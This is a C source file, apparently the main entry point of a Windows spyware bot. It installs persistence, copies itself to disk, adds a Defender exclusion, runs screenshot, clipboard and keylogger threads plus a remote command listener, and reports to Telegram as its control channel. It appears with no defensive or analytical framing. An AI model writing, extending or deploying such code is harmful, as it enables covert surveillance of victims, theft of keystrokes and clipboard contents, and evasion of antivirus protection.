#include "../include/config.h"
#include "../include/telegram.h"
#include "../include/persistence.h"
#include "../include/keylogger.h"
#include "../include/screenshot.h"
#include "../include/c2_listener.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Single instance protection
    HANDLE hMutex = CreateMutexA(NULL, TRUE, "Global\\UnifiedBotMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    GetModuleFileNameA(NULL, g_exePath, MAX_PATH);

    // Load saved Telegram command offset
    g_telegramOffset = LoadOffset();
    SaveOffset(g_telegramOffset);

    char debugMsg[128];
    sprintf_s(debugMsg, sizeof(debugMsg), "🔍 Loaded offset: %d", g_telegramOffset);
    SendTextToTelegram(debugMsg);

    InstallPersistence();
    ReplicateToDisk();
    AddDefenderExclusion();

    SendTextToTelegram("=== Unified Bot Started (Screenshot + Keylogger) ===");

    // Spawn Background Threads
    HANDLE hScreenshot = CreateThread(NULL, 0, ScreenshotThread, NULL, 0, NULL);
    HANDLE hClip = CreateThread(NULL, 0, ClipboardThread, NULL, 0, NULL);
    HANDLE hTimer = CreateThread(NULL, 0, TimerThread, NULL, 0, NULL);
    HANDLE hCmdListener = CreateThread(NULL, 0, CommandListenerThread, NULL, 0, NULL);

    // Install Keyboard Hook
    g_keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
    if (!g_keyboardHook) {
        SendTextToTelegram("ERROR: Hook failed");
        return 1;
    }

    // Main Win32 Message Loop & Self-Healing Watchdog
    MSG msg;
    int healCounter = 0;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);

        healCounter++;
        if (healCounter >= 60 && !g_nukeInProgress) {
            healCounter = 0;
            CheckAndHealAll();
        }
    }

    g_running = 0;
    FlushSentence();
    UnhookWindowsHookEx(g_keyboardHook);
    if (g_hiddenWnd) DestroyWindow(g_hiddenWnd);
    ReleaseMutex(hMutex);
    return 0;
}
